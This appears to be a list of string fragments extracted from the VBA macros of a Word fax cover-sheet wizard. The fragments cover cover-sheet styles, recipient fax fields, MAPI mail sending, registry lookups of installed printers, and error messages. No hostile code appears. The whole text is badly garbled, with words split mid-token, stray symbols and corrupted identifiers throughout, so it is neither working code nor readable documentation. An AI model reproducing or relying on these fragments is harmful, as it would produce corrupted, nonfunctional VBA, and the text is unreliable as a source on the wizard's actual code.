            "Mf\u18f1ToA4",
            "Activel._",
            ".HM argin",
            "4_LEFT_M`ARGIN",
            "igh\u05a8",
            "RIGH",
            "LETTER",
            "((((@T 0%oc!r)) AN(iNumRcpnNS`lP",
            "OrO)b",
            "*b=HC!",
            "L$Sel8 Case iFax",
            "STY_PR",
            "OFESSION",
            "TEMPORAR>Y",
            "EL EGANT",
            "Eleg-",
            "'{op",
            ".Value",
            "\t>/W",
            ".Cap\u0449 & \" -0",
            "&8s~",
            "WINDOW_CAPTp",
            "\t+z/",
            "COV`)SHEET",
            "With A:",
            ".View.Ta",
            "bleGridlinesE!",
            "6UndoXX&",
            "HomeKey0HStory",
            "Spel",
            "Grammar",
            "> r9'",
            "/?m&",
            "'s Da Wa s8 ",
            "f`Vcovert sd PP!",
            "Xp`. dir7",
            "Privr-=(sDeR]R\ud98b\udcfap",
            "oklpn",
            "aaMM",
            "E<7S",
            "OpenP",
            "98, $\u04470(:=",
            ".)2&",
            "1*%a#5:3",
            "Ots#",
            "1!i?",
            "S%<From^",
            "= OrMs.De`fault",
            "\u0471&(wdTemp",
            ", 1)",
            "Separa>.l",
            "AX~$pa\\@\"",
            "\"dd-mm-y(y\")",
            "\") & \".t@mp\"",
            "bjDataSr",
            "cDoc.SaveAs str",
            "Name, wd@Format",
            "ment",
            "tClo",
            "RDoNot",
            "Changes",
            "'attach the d",
            "u sourc",
            " to acti vedoc",
            "cover sh0eet)",
            "MM.Open",
            "Exit S ub",
            "nlE rror:",
            "RePport",
            "'create",
            "s a tabl0e inZSwipth n",
            "\"number",
            "|'sbf of",
            " just li",
            "ke how on",
            "ould ;",
            ";Ithrou",
            "gh Word",
            "Priv",
            "CVTTFrom",
            "FaxInfo(uR",
            "DimwText",
            "String",
            "IntegLer",
            "AOnAGor GoTo GQ",
            "_FAX_NAMEvbCr",
            "UMBER",
            "'collect",
            "BGP ",
            "ered by",
            "usA&%",
            " i = 1 ",
            "%iNumRcp<ntD",
            "&(& y",
            "JAs(i - 1\u0192",
            "EY.In'tBe|eXD9Add2 ",
            ">umn",
            "0+1 row19F",
            "io n.ContT&o",
            "~B7, ",
            " + 1, 2C",
            "Abo%|.y 'c",
            "}Qxc",
            "kPubl@ic Fun",
            "n FCopySptyle",
            "BooleanC",
            "Long",
            "\\Templk@",
            "FounmLFi",
            "D' At",
            "Wo locql`",
            "X,Un`",
            "WiLON~G",
            "Pa& We",
            "F`\t!",
            "'?\t$",
            "If Dir",
            ") <> \"@\" Then~L",
            "Appl",
            "LTrySh",
            "SHORT",
            "StatusB",
            "ar``",
            "APPL0YINGc",
            "' GetqL#",
            "m]P;e+ k\"#",
            "' No",
            "fb*sYi`= TruD<",
            "n=ea",
            "qDIf",
            "orMsgME",
            "RR_STYLE",
            "_NOT_FOUND^&&o",
            "Falso",
            "x{pro",
            "fess`Ral/R7orary0\t",
            " WStteP",
            "E1YngBuffxer1",
            ")Cmpny13{",
            "sK,!",
            "M@FFirst",
            "r0MFLa",
            "\tQpb",
            "0,i !_CON",
            "TEMPORAR",
            "Y)3r",
            "Auto",
            "mllapBC@",
            "Returnvr",
            "MergeField",
            "\u0661um#",
            "#mpany",
            "= !Wiza",
            "rd.txtCoM",
            "ROFESSIO",
            "NAL)M",
            "f (Len",
            "MPANY",
            "titqa",
            "DOC_LABEL",
            "e/(/(d '(#",
            "Rng1",
            "5= \txDupp",
            "t opics0: ah: hP\u0423pchar",
            " whihas2bS'aPz",
            "hafNtP",
            "be|wri",
            "nmin`!",
            "ve aSdi'aM@SR).",
            "rbO5",
            "\"M08age Head",
            "L\".-",
            " subsequ",
            "'lin\u0592",
            "48Top\\",
            "l\"MSG_HDR_FIRST",
            "j\"p2TOc",
            " recipiQ",
            "2?Wf\u0280RA",
            "(} $(fpIsALtr=/",
            "ertA2",
            "vb%`w",
            ".+0-",
            "'inse",
            "rt appro",
            "priate f ield",
            "jActiveR@ange.I",
            "fter vbT",
            "RColla@pse wd",
            "If ((i",
            "NumRcpnt",
            "s > 1) O",
            "r (fDocI",
            "sFormLtr)) Then",
            "Merge",
            " strMFFi",
            "rstName,  True",
            "(f Len(",
            "SPACE",
            "1t_#s",
            "sMBw",
            "NVacroButtonV",
            "EMPTY_MA CRO &",
            "ICK_HERE",
            "_NAME, Fal",
            "M!XTI",
            "'S Fr",
            "ore2FROM",
            "DRng",
            "Buffer2 ",
            "H.Dupli",
            "sender's n",
            "zard.txt",
            ".Text",
            "vbCr",
            "Ye m!Gb\"G",
            "Paragraph",
            "'sDch",
            "stylor topics",
            "\tQH1.Sb",
            "=aMS",
            "hSG_HDR_LABEL",
            "'n G 3 ",
            "lines in",
            " \"Message Hea",
            "/tx ",
            "beCL",
            "hjAX{",
            "Mj1Zjc",
            "And (Not]",
            "H@crgr",
            "Fax@!s(0)\"f&_ftH",
            "Efthe!J~OtdEtB",
            "<gww:dr",
            "M_d_dTdFA",
            "X_NUMBERd",
            "vpw#",
            "g/DAT}/dd",
            "Ti!\"\\@ \"12QUOTE",
            "_FORMAT",
            "'NWW",
            " Phon",
            "\"PHON\"oR\"?_I",
            "!~!<_U",
            "osw:PAGES",
            "9ap6",
            "trR77#l",
            "?,k77`,^zt",
            "ttSUB",
            "JECT, Fa@lse",
            "bjActive",
            "Range.In",
            "sertAfter vbTab",
            "Collapse wd",
            " CC:",
            "Before  strCC",
            "*RngBuffer2 =",
            "\tDuplica",
            "tU\\Field",
            "Macr",
            "oButton,",
            "^EMPTY_M@ACRO &",
            "ICK_HERE_NAME",
            "chara",
            "style ",
            " topics'",
            "SJSG_HDR@_LABEL",
            "'conv",
            " the tex",
            "t into a` tabl",
            "c@\"T",
            "le.@",
            "Select",
            "ion.CC!To",
            "Auto",
            "Fit:=TruBe",
            "]orma@",
            "WithtB",
            ".Borde|rs@+A2@",
            "ows.Spac",
            "eBetweenlumns",
            "If iFax_BiA_CONT@O",
            "RARY The",
            "LeftIndent",
            "_LEFT_INDENTG",
            "professCal",
            "jtempora",
            "ry has aEBl",
            "6i|B9lines",
            "-ells.",
            " (2).Wid",
            "WIDTH_COL14",
            "  .B/",
            "Horizo",
            "ntal).Vi|siO '>",
            "Bo`vm",
            "Cr abbc",
            "*Check0Boxe",
            "Body_",
            "HjHd",
            "Docum=",
            "Starp",
            "qtit",
            "D<OCi",
            " crg+gTa",
            "(h) B' vbCr",
            ":xit $Su@Fa@GErHrorReete\"",
            "'cre`<n Lgatco ",
            "shee@%Pri&v",
            "ElegCA",
            "(@(DimRe1 HAs ",
            "AmpnyNa",
            "Strin",
            "irst",
            "axNum",
            "Intege",
            "or GoTo@E",
            "C\"ReturnA",
            "ddrPO",
            "Get`Mergeby",
            "5.company\\ n",
            "wmWizard.txtC",
            ".w<A",
            "<(Len(i",
            ")_,83COMPANY3",
            "$2e.",
            "????)",
            "?J>\ufaa74Q`6",
            "'[ To",
            ": and From:@tve`which",
            "v ub0'aped`",
            "bp wr",
            "itX (sinc`he ",
            "diaZc}).  so, u",
            "a rr! b",
            "1xst a|c",
            "M2age HeJa",
            "A\".( subsequa'r",
            "?-nFxIRS$o",
            "BP!05FROM",
            "SO ER\t\to3g3F2u",
            "|in@`Rn/",
            "QBi HRc",
            "pnts > 1@) Or fP{IsFpLtr<Cs",
            "?N,w\u0266PuN%`, ",
            "\u0451 'P",
            "Terv1w\tt0d",
            "00\tK?RKq",
            "PACEG",
            "IM!p",
            "!d0bs(\u0161",
            "___3",
            "Z'4k",
            "d.txtSen",
            "derName.Text",
            "If Len(s",
            "`) Then",
            "tobjAct",
            "iveRange",
            ".InsertA",
            "fter vbT`ab & ",
            "tElse",
            ")Collap se wd",
            "Field",
            "roButton",
            "UEMPTY_ MACRO]CL",
            "ICK_HERE",
            "_NAME, F",
            "^Paragpraph",
            "HL pIf",
            "d'@set ch",
            "style f",
            "or topic",
            "s'RngBuf@fer1.S",
            "gSG_HDR_LABEL@",
            "'n 3 li",
            "nes in \"",
            "Message Hea\"@",
            "?xNumb",
            "wand Datq3",
            ".FAX_NUM",
            "BERB\u0193DAT:E",
            "Lz.Duplic",
            "C@SOFT_ENTER",
            " tUual@T1mationAWthe B\\[",
            " recipient nBX",
            "(i\\Rcp",
            "nts > 1)",
            " Or fDoc",
            "IsFormLt",
            "r![ergeCB",
            "MFFa:,",
            " True 'P4rexv0",
            "ti<ng",
            "= 1?rtD:rg@,\"",
            "s(0)'",
            "dvvHw",
            "ue;dOf",
            "Time, \"\\",
            "@ \"QUOT",
            "__FORMATh",
            ")\t\u07d0\u0110.",
            "\" Company!",
            "COMPANY",
            "LTOTA",
            "L_NO_PAGES",
            "\u07c5%cc",
            "\u07ffC_\u0584#D_ {at{ S",
            ",/ }b\u07ef",
            "-1jSu-@Phone $s& Re:",
            "-0PHONorRo3",
            "oo?4",
            "++\u03e3\u0551",
            "SUBJECT",
            "++x8",
            "convT Q",
            "to a ta<bl'@",
            "pleN.",
            "'-@'",
            "don't wa",
            "last CW",
            "Selec\u035f$a2",
            "0.C#",
            "(e, 100, 2`",
            ".Bor~s",
            "2pW ",
            "2 To 8 Step 2",
            "%jow0",
            "Rows(i\u0112a",
            "\"3].Lef",
            "= 0.25 * 78",
            "need",
            "boxm b",
            "ow.\t <>",
            "aABA",
            "(wdu",
            "6CheckBoxe~S",
            "0Body'",
            "it Sub",
            "FatalErr",
            "orTReport",
            "vs of",
            " \"sp be",
            "* sh4ee\"'",
            "igin\u043ddoc0. is +Q let ",
            "n w\u0751",
            "P\ts\"(P",
            ". not",
            "Ers1",
            "crePd",
            "@a soHurc",
            "Priv",
            "rstName ",
            "As Strin",
            "g, strLa",
            "FaxNum",
            "Error Go",
            "To Fatal",
            "If (f",
            "DocIsFor",
            "mLtr) Th",
            "D'use",
            "r select",
            "s fr",
            "om drop-",
            "down of ",
            "all poss",
            "ible mer",
            "gefields  in d",
            "x s`ource",
            "zard.cboF",
            "9Rcpnt",
            ".Text",
            "= \"\"",
            "6Els",
            "LD_FAX_NAME1",
            "End ",
            "xit Sub",
            "Report@",
            "Private",
            "tReturnAddress(",
            "(DimIFPh",
            "('Se",
            "t objAct",
            "iveRange",
            " = C",
            "@ument.Cont",
            "'Sty",
            "= iSTY_",
            "CONTEMPOpRARY",
            "lapse wdCo",
            "txtSen",
            "derPhoneH",
            "Mail",
            "Su Ca@",
            ",!PRO",
            "FESSIONAL",
            "*Len(",
            "& vbCr",
            "I) <> 0c0_",
            "PH`w",
            "RSPACEC",
            "3ELEGANT#",
            "Strxla",
            "ceCrLfWi|th",
            "A03k",
            "BULLETh",
            "'if y",
            "ou have ",
            "p\\ numbe_<a\tQ\"`",
            "@check D",
            "also",
            "insteadAE.  sp ), bullet@'",
            " combinatioha",
            "%AMH",
            "only",
            "y/2/2t",
            "^.E\\",
            "TURN_ADD$q",
            "lBe\u0406eB",
            "ge^se",
            "uudSx",
            "s the ",
            "-boxes ",
            "associ xd w0=Q",
            "oyC.B",
            "5yiAtIng7xR1!",
            "MSG_HDR_LASH",
            "_q]r",
            "=uDuplic",
            "A Templ",
            ".Auto",
            "esbNT_UNC",
            "HKD_BOX).",
            "(R1`M",
            "\tA1%= R1.",
            "Star",
            "Aft\t\u0471trs<+ rg1",
            "Chkp",
            "(1) + oTa@a",
            "Emphasis",
            "g) i`",
            ".Qatted\tS",
            "S/1(1",
            "N5ri",
            "'dP7previous`9",
            "aracQ",
            "i.e:l@ t",
            "graph?",
            "FrtBodyR,",
            "=HZA]",
            "\"CNot0M",
            " & strAf",
            "terText",
            "(Set ",
            "R1 = obj",
            "ActiveRa",
            "nge.Dupl`icate",
            "ollapse ",
            "XInsertField",
            "MacroBut",
            "ton,",
            "TY_MACRO",
            "CLICK_H",
            "ERE_COMM",
            "ENTS, FaBl",
            "s'Pre",
            "eFormatt",
            "Styl",
            "\tBodby~R1.",
            ">SG_HDR_`LABEL",
            "xit Sub",
            "FatalEr",
            "ror:",
            "Rep(ort",
            "Priv",
            " ContAu$toA()On",
            "or GoTo?",
            "Wi@zTempl0.",
            ")Entries",
            "gCNTMPGFX2).=(",
            ", True Q8Dis",
            "sgBkRR_AU",
            "TOTEXT_N",
            "OT_FOUNDcH?A7Pub@",
            "estoreDi",
            "alogValu",
            ")fDummy ",
            "As Boole",
            "an# Dim ",
            "fAddrBkExnab@p",
            "IntegercG",
            ">hkdA",
            "\t\\[tatu0sBar",
            "T_SETTIN$GS",
            "n.ScreenUpda",
            "System.Churs@v=A\u0242",
            "\u07c3\t9= ",
            "MAPIAvai",
            "~ard",
            ".cmdRcpnts",
            "J.CJd@!",
            "Sender",
            "s in ",
            "Panel1 d",
            "\t@o on ",
            "whether ",
            "a doc. is pAtnt ",
            "If fD",
            "ocw@",
            "Then",
            "Cov@ShtYesp",
            "'disJa",
            " bunch o|f ",
            ",H=l",
            "List",
            "$*frmGKA\"1isiaq=c2%",
            "Ordk",
            "IfE'BJ2",
            "'read v",
            "b from rDeg)ry.",
            "i`FaxOpQ",
            "CI$`Jf(\" ",
            "0\", 0\u4260NIn",
            " (UCase$(dsOper\"w",
            "), \"NT\") RMSFAX+d.+`",
            "8KPf",
            "#J's@(prir",
            "mbo-box beee ",
            "YAp /%`",
            "D@er$GetAll",
            "': c",
            "ols are ",
            "assumed to",
            " eWd`",
            "it@[ly anRdr",
            "ex!Piuy\t",
            "turn",
            "off, nev@",
            "iMS_",
            "Not (z",
            "iToqNume",
            " > 0",
            "DIFF",
            "Select q% 7",
            "lblO",
            "0fOQ]",
            "mTk02D",
            "ifferent",
            " c#(+(",
            "fR`NamesRb",
            "wtxt",
            "d9UP\u0171",
            "fCountL",
            "Aess",
            "Ct, iMA",
            "X_ADINESdhH",
            " mo\u02e3",
            "yxo\"\"o",
            "Phonee",
            "*E\u051bxersh~e",
            " iPROFE",
            "SSIONAL)P Or (",
            "E@LEGANTca _",
            "Prof?L",
            "0.VvG",
            "CONTORARY/",
            "rd.lblSt",
            "yle1.Vis",
            "ible = T@rue",
            "ase iSTY",
            "_ELEGANT",
            "formWiDza",
            "leg.Valu",
            "}End Select",
            "On Erro",
            "r GoTo -",
            "1 'reset e",
            "trap",
            "Resume N",
            "txtC",
            "ompany.T",
            "~System",
            ".Private",
            "ProfileS",
            "tring(\"\"",
            ", strREG",
            "KEY_CMPN@Y_NAME",
            ")CfSe",
            "sCtor",
            "7Curs",
            "i= wd",
            "al StatusBar",
            "Applicat",
            "ion.Scre enUpd",
            "Exit S",
            "\tReportT@",
            "Vs d",
            "efault m",
            "erge fie",
            " FillM",
            "(fDum",
            "my As Bo oleanBDi",
            "Inte",
            "ger, iCoHunt",
            "\tFirstNal",
            "Mai0",
            "TempDoc\t",
            "n@COK",
            "the qu0ery ",
            "so that  all n",
            "Js $in@",
            "e @a ",
            "src are rsed",
            "DBSrc.G\"",
            "Rea6(-D",
            "- *1_FZiR1 u",
            "(i).1G",
            "If In@9(n",
            "FLDbr) Then",
            "\tElse?\t*9u\t",
            "Q\tIf",
            "FAX6",
            "@aAI",
            " i#K,",
            "A ic",
            "cboF",
            "ntZ.List`6g1",
            "8Num",
            "aG.A",
            "ddIaNONE_",
            "@?(HD<>`{1>'",
            "X*dgAC",
            "rrrSrreaevesX's",
            ">number[",
            "Zreg3 ry.",
            " RpeadR$",
            "(sotP",
            "Vjhftk",
            "kCtrls",
            "Objj",
            "\tp=c",
            "!mpg",
            "s(iPA",
            "NEL_RCPN",
            "cntrolP`  ",
            "qaj ",
            "saMAX",
            "1MRU",
            "j%bS@",
            "Pref(",
            "_ & j,8 \"\"",
            "UMBER",
            ")ZNx",
            "_NUM",
            "axSD",
            "...*#+Sava",
            "alog25*n?",
            "o'i'",
            "VE_SETTI8NGS",
            "_BAS`E_KEYB",
            "_@ASSIST_",
            "TAMP",
            "), mat$(",
            "Now`(GenePral ",
            "e%)S",
            "HELPLoca0'",
            "5/ \"P1 Op",
            "\tiDIFF_R\"\t",
            "2Derp",
            "<`ax",
            "\t8 \"Sender \t",
            "Pho<ne",
            "ef  \"Cov VheR",
            "Not 0VocIs1",
            "Ltr3| -nsInEQ",
            "O;O;O;B;#",
            "ireci",
            "pient na",
            "mes and ",
            "numbers ",
            "of iMAX_",
            "RCPNTS r",
            "'The",
            " tagged 0to t",
            "So, you ",
            "can have",
            " without",
            "rivate S",
            "ub S",
            "KRcp",
            "ntsInRegistry()",
            "EPDim ",
            "As StrinHg",
            "Integerh, j",
            "!objCtrls",
            "Object",
            "On E",
            "rror GoTo Fatal",
            "k = 0",
            "initiali",
            "array",
            "at e@ven if",
            "user",
            "chos",
            "firs",
            "XrgFax!s(0))\"\"",
            "mC`6",
            "Set ",
            "I= formW",
            "izard.mpgC",
            "Page.",
            "s(iPANEL!\u0117).Co",
            ",olVs",
            "F@UiA",
            " @VI- 1C",
            "w=|Searc",
            "hReplace(",
            "_NUM & i",
            ").Text, ",
            "vbTab, \" \") 'DG",
            "If (Len",
            "@)) n '",
            "lC\u0301j emptny",
            "O[ASk",
            "-'storD",
            "@b9AME9",
            "correspxond",
            "!Wk, +)-A",
            "*BER\u0640",
            " = | ",
            "jB;LInd,ex+",
            "'bmsel@zonef n8ice",
            "R2@j `<> -1",
            "M,RUAi;j#i  ",
            "'already  pick",
            "up/sN'",
            "E If",
            "\u010aWhile (k <\t`Y",
            "@Sn't ysIh\"C",
            "'grough\"!!",
            "orginally@{tain@",
            "Ywhich",
            "A`\"Bmo+y+0)A1",
            "a!jq",
            "UWen(",
            "LReHtur",
            "|nobcs leftf`a",
            "Else",
            "ftrf^H",
            "s(HEh",
            "<p0R'}5O,",
            "Exitqz",
            "@YortrP",
            "Subqt'c",
            "walbqak",
            "#LcaQan euppDoc",
            "a6~CDov",
            "rsheQ-s",
            " d;t)aft1`",
            "fax!MYo c",
            "ActivedocumP:new",
            "s\tVars(f\u05c9",
            "qBoolean",
            "*Q6a",
            "iablF",
            "FldG",
            "- Sq",
            ".HAddZUM",
            "x, F",
            "(HJ> ",
            "e| So^",
            "\tZ2i, -iai",
            "NTwj",
            "  )Y",
            "fNo)Sht",
            "\t\"+S+\u04f0tt\" 0",
            "t#=1C",
            "EwhpE2 P1ion21 ",
            "SDIFF_FAX",
            "'r%\"MSpx ",
            "(cbo",
            "f\t@1Is(mLtr?_0 ",
            " Fie?\u047a`",
            "@a{!JpPQL1_o ",
            "Svainfo. ab!SN\t",
            " 2yNot ((",
            "P#.C",
            "2L d",
            "a -nn O\u0130pO",
            "s Yk E y???",
            "f\"s.;+ThsEmail",
            "Z?%tumrem",
            "C!vbLF f",
            "romR`n",
            " of the ",
            "string",
            "@'until",
            "ast char",
            "acter is",
            " not a v@bLf or",
            "Publi",
            "c Functi",
            "on StrRe",
            "moveCrLf",
            "FromEnd(",
            "Text As",
            "hDim",
            "Intege",
            "2i = Len",
            "If (",
            "0) Then @GoTo L",
            "e= Mi",
            "=, i, ",
            "1!'check< f",
            "\"Whpile ",
            "&) Or\tCr",
            "Ki - 1",
            "\t! FWend",
            "ft\tjO",
            "sanumb@vlines inw$B",
            "@(ByValkW",
            "haHu,",
            "NewzVMax",
            "s;AA",
            "= \"F\"",
            "= In",
            "KjA+,",
            "DeCq\t",
            "< iA8",
            "PElse",
            "  `+$va",
            "`) > 1t",
            "E'<>@F",
            "9t &",
            " ' 'n",
            "'in serts`tfi",
            "eldBype iFldT",
            "range witha",
            "Bra~t@. Fb",
            "replac`",
            "objRs o pas!",
            "llapsed ",
            "always.",
            "and upda",
            "to be ",
            "\".riv",
            " Subt",
            "veFormatt!C-!`\t",
            "ErrFat",
            "-AISetZ ",
            "s0.Add",
            ".C0 wdE",
            "AH= .",
            "*.Start@",
            "xi2t",
            "gReport",
            "e$all occuren%",
            "vbCR030rF",
            ")&delimi?p9",
            "turntjew1,0",
            "S#D1",
            "'m~pg",
            "Emp)p",
            "d^'r",
            "@thro' search 9$",
            "qLf,Q",
            "nhow $",
            "fP35P G'c",
            "`shouPTmak*",
            "  KE",
            "a one",
            ")ppMof",
            "+ng2",
            ") 'pZAk",
            "K5(b",
            "0'&mpP^",
            "%1P\u0161",
            "'a)ezwev/",
            "efm*origin#\".",
            "mD(:",
            "veRcpnts",
            "InDocVar\"saCrePCmdBar ge@@propag@",
            "d  back",
            "athP",
            "ftP5St",
            "Fax(@fDummy12BooleanT",
            "~K~$i",
            " iNO_FAX",
            "ZEq#",
            "a'NotB ",
            "ocIsL",
            "trp'Ap",
            "(iN|umS",
            "'don",
            "t s ",
            "pYcipie",
            "infom let u",
            "s (K",
            "mLtr))",
            "PIf (f",
            "NoCovSht",
            ") Then '",
            "fax the pdoc.",
            "^DocIsxFor",
            "TF`axReg",
            ",E8lse",
            "1Cre",
            "ateCmdBa",
            "xit ",
            "alError:",
            "Display",
            "Msg str",
            "ERR_CREA",
            "TING_CMD",
            "Repo",
            "will be tak",
            "care of ",
            "in Setup",
            "PriVvXI \t^(D@im objf ",
            "As CommaFnm",
            "Button",
            "Applicat",
            "ion.Cust",
            "omiz",
            "text = A ctive",
            "Iument",
            "!s.Add(I",
            "F_F_TITLE, PosiA",
            " :=mso",
            "ng, Te",
            "Nary:=TXrue8",
            " xa b.",
            " 7=\".-rol",
            ".Sptyle@<A%B",
            "Cap) ",
            "6TN_TEXTC\t'C",
            "OnXon",
            ".Visib:WYC",
            "~er shee",
            "t is del",
            "eted aft",
            "ing if no cov)",
            "by user. So,\tM`M",
            "new*",
            "A_Bool<ea ^",
            "umRcpntseA",
            "I`_ge",
            "=`\tNames",
            "(iMAX_RC PNTS)A",
            "StNr",
            "6Var",
            "ia6sE",
            "Pres sq",
            "TmpMMa",
            "ailMergec",
            " $Fldg\td",
            "Attach",
            "1eOna",
            "or GoTo o",
            "SEND_FAXdV\u02cc",
            "Obxs.",
            "..'iE= Val(4NUM",
            " cSsbh9\")",
            "&x U",
            "cDa:\u2ae1#( Fie",
            "'obt",
            "hj Hto m",
            "FInvali'",
            "'4!4",
            "Y i`",
            "1 0.",
            "lF - 1",
            "%RG_NAME & i!",
            "UMBEjR",
            "2[nrT,n s",
            "> d +",
            "Ca`curraHpo",
            "%J)d",
            "Len!",
            "Ipfir~s$",
            "'# >!;5!",
            "+YnL,Z",
            ".Desti&nP)wdTTo",
            "gBox \"5",
            " 'n ",
            "\tAsciP",
            "O1\t1",
            "ddvs",
            "Sta8tus@",
            "S_RECIP",
            "Exexcut,\u03b7",
            " =} A",
            "TO`@`.P",
            "...\\",
            "I0_u}",
            "rxp# ,",
            "\"$o  \"",
            "@U`.'Ou<",
            "B70o",
            "{p\"TH2LR",
            "Zt4- XVr.Xdeesh",
            "(XB= ",
            "q!WN&,aq",
            "'\u0424dA",
            "x Then A",
            "pplicati on.Op",
            "SendMail",
            "Attach =",
            " True",
            "For i",
            " To iNum",
            "Rcpnts -",
            "HIf fpMSFa",
            "tatusBar",
            "strFAXI",
            "NG_DOC_T O & \"",
            "& $rg",
            "_s(Di)",
            "Aobj",
            "n8Doc",
            "/'MsgBox \"",
            ")ing to ",
            "d8ame2>#El",
            "acRECI PIENT",
            "tr(i + 1B)\t...\"",
            "iPrintOut",
            "End If",
            "@Next i",
            "LReset",
            "&er f",
            "non MS fax",
            "Active",
            ":Dis",
            "playPostWizTip @",
            "MSG_",
            "_SU@CCESS,\u0225'",
            "DeleteCm",
            "CMD_B",
            "AR_TITLE",
            "xit Sub",
            "FatalErroALt",
            "b.ber\tIi?C",
            "& 0vbCrv@",
            ".D`escriBC",
            "'Hif ",
            "led e",
            "b @sag",
            "=  iERR9NO",
            "T_INSTALLED _",
            "R{F`&F\u0291F c",
            "D!Hel\"LWI",
            "N_HEa&ILE",
            ", lCNTXT",
            "S~AXr$l",
            "!\"W'Cov",
            "zshDeeIs d^d aft|ax!!",
            "Nno c+",
            "tNby user. So,",
            ">C,documen",
            "new*",
            "@wvategaY",
            "mL` ",
            "m\u017dAs Boo0lean",
            "Integl",
            "tin\"a",
            "Lon$",
            "Vars",
            "iables",
            "TmpMM",
            "lMergec",
            "\tFld\t",
            ";On ",
            " Go\u99d1",
            "S@ = ",
            "(9.\"",
            "f1@= Val(t",
            "(6\"P",
            "#S\"%",
            "luew,|",
            "ain ",
            "!Q\t'obt",
            "handlem",
            "FInvali1a",
            ")#]EZiB",
            "hrough E}",
            "8= wdTor",
            "ToT:",
            "vp, t`",
            "xTdrPrQ",
            "he currqOt",
            "?C+d",
            "@axG",
            "basefirs",
            "\t(dC*",
            "T*COG+#P",
            "]\t^\u01ba",
            "la0: (G",
            "Add}`_sB",
            "(CS_So",
            ".Executv",
            "] 3U.#sp.UpdPs",
            "0Not (p)[",
            "d\u036f\u0372p",
            "\u036fKd2",
            "  If i T",
            "hen strE",
            "rrorMsg ",
            "h& vbCr",
            "|.Des",
            "cription",
            "'if ",
            "Fax not ",
            "installe",
            " mes0sage",
            "iERR_FAX",
            "_NOT_INS@TALLED",
            "\"HLP",
            "\tDispl`ayTip\t",
            "'reset ",
            "printer ",
            "bn MS0 fax",
            "Y(N!",
            "l(fMS",
            "SApplica",
            ".ActiveP",
            "]Hel",
            "N_HE",
            "wILE",
            ", lCNTXT!}Else2SENT And ",
            "c5Ag",
            "STo d\tC\\ h-usin",
            "files.@ Assum",
            "that theH",
            " are",
            "cdnA",
            "window",
            "rector",
            "Zvate ",
            " HI(F",
            " Stcg, ByVal",
            "Ko@x",
            "Long)",
            "0Dim iSi",
            "TmpBuffAs",
            "WinD",
            "Wnd8Nam",
            "hOxpus",
            "*zRpesul",
            "M0acro",
            "C\t'G",
            "PPi@512",
            "$(i, 0%j",
            "= \"\"c",
            "(j > i",
            "Left$",
            ", 1) ",
            "<>PathS`eparaK",
            "'F`X word's 1",
            "$AMS_WOR_",
            "SBt!_= wd",
            "MaximX",
            "& \" -`",
            "d& J",
            "Q=f ",
            "(\"S\",",
            "\td- ",
            "0c)GoL`",
            "\"Z LJ",
            "QUODTEK",
            "lVCD|@",
            ")dRl",
            "#s8\t, bCOMM8ANDB",
            "s a ",
            "duA po",
            "st-wizard o+s aes i\u685es",
            "@ce i ",
            "s ccfrom\tb",
            "o0`Bb",
            "objBlln",
            "1+On r ",
            ".New",
            "With ",
            " .ModeEms&o",
            "Headb+izN",
            "<Te ]",
            "Bupttonc",
            "6\t.Show3",
            "NonNe.9",
            "eag'",
            ",OKOnly +",
            "'ROUT",
            "INES TO ",
            "OBTAIN P",
            "RINTERS ",
            "FROM REG`ISTRY(yls rg",
            "6p$nOq",
            "!xlo",
            "remow",
            "n0lsp",
            "tain",
            "!ry. iTo",
            "$Num",
            "aq/e numbyuof0/",
            " peAll",
            "(P,{",
            "= Dk",
            "Rea\tPArve",
            "0XN149",
            "mWB.HcboDrr.L",
            "Index",
            "1\"'q",
            " cmdO",
            " to stel",
            "~ /S",
            "e0ue so$#",
            "= Reg",
            "Open",
            "EY_LOCAL_MACH02/_PROVID0, h",
            "POR_SUCCES`4",
            "W<\t3",
            "P\tCloseQ",
            "f;.Provide",
            "Se(rs",
            "pLen",
            "= 256",
            "\u7afc\tbA",
            "#Qz#S6",
            "& \"\\",
            "& P%",
            "Rpx= *",
            "Whp8 (R",
            "pPrinter",
            "Server =",
            "g$(c",
            ", 0)",
            "fReg",
            "EnumKey(",
            "ProvidA",
            "s, dw",
            "Index, l",
            "iIf ",
            "<> ERROR",
            "_SUCCESS",
            " Then Go",
            "To LClos",
            "iLenS",
            "\u07c0|In}(MChr$(0)IDB(",
            " > 1)F'no name",
            "str8Leflt$8---&G",
            "et&N4sFrom",
            "\"End If",
            "+ 1!",
            "Wend",
            "\t@Bfb \u0447DV",
            "$5C/7s",
            "+SubA+",
            "? As",
            "DimA",
            "Long",
            "FA_G",
            "aa)lRet",
            "c5Sb~+#6",
            "= 256",
            "= 0a",
            "On Error",
            " Resume pNextC",
            "YREG_PRO",
            "VIDERS &'c[CE",
            "5\\\"Ce",
            "\t& \"\\",
            "EOpen=",
            "(HKEY_LO",
            "CAL_MACHINE9",
            "A#7a",
            "While (",
            "=s5g",
            "`= \uf33a",
            "\"Se8",
            "System.`Yvat",
            "x(\"\", \"X%b.Yf2",
            "sV !",
            "(iTotal",
            "Numu8 Mod0 10)",
            "Re1YPresQ rg[",
            " j\tQ",
            "UCase$(\"\\DQDk",
            "zCi<4",
            "D!z9z",
            "SzRemo*",
            "sbukT",
            "\tXs]",
            "'g}th",
            "e list of ps a",
            "pcall\u04d0\t5fueach",
            "GSob ('",
            "a 'length",
            "$= c",
            "s iq2",
            "PC>etLop)((",
            "=<gO\u03d9\u02990#PRINT\u0419",
            "\"Exit ",
            "O\ufcf9A7",
            "dex As L",
            "Dim  lRet",
            "iLenPrinterName",
            "0ger",
            "cb\t>= H256",
            "0I\"n",
            " Error R",
            "TNext",
            "= ERR",
            "OR_SUCCE",
            "While4 (",
            "gEnumKey$(h",
            "2, -",
            "<>l Then",
            " GoTo LEndLocal_",
            "= In",
            "HChr$(,0)",
            " 'no nGx",
            "Rstr\" = Left$",
            "System",
            "vatePr",
            "of}Cq(\"\",",
            " \"HKEY_L",
            "OCAL_MAC",
            "HINE\\\" &\" @+REG",
            "PRINTERS",
            "!\"E9#",
            "if valid",
            "BL, add to lis\u0131",
            "]TotalNu",
            "m!s Mod 10)@U",
            "Prese@rve rgK%s(i",
            "UCase$!",
            "\t` Ifg",
            "Wend",
            "uba'disp",
            "lays post wizar",
            "<ip in a@",
            "utodown ",
            "balloon ",
            "AAss?ant",
            " is visi",
            "Public ",
            "WizTip",
            ", f MsgBo",
            "BooleanT",
            "@obj",
            "RFalse]\t%2",
            "a!.New",
            "With ",
            ".be`",
            "mso!",
            "Headi|ng`",
            "Butt1=  ",
            "Non 1a",
            ".Show+J%",
            "5 B`",
            ", vbInf@ormati",
            "OKOnly qA",
            "App@NB",
            "(al,F%A",
            "@A Func",
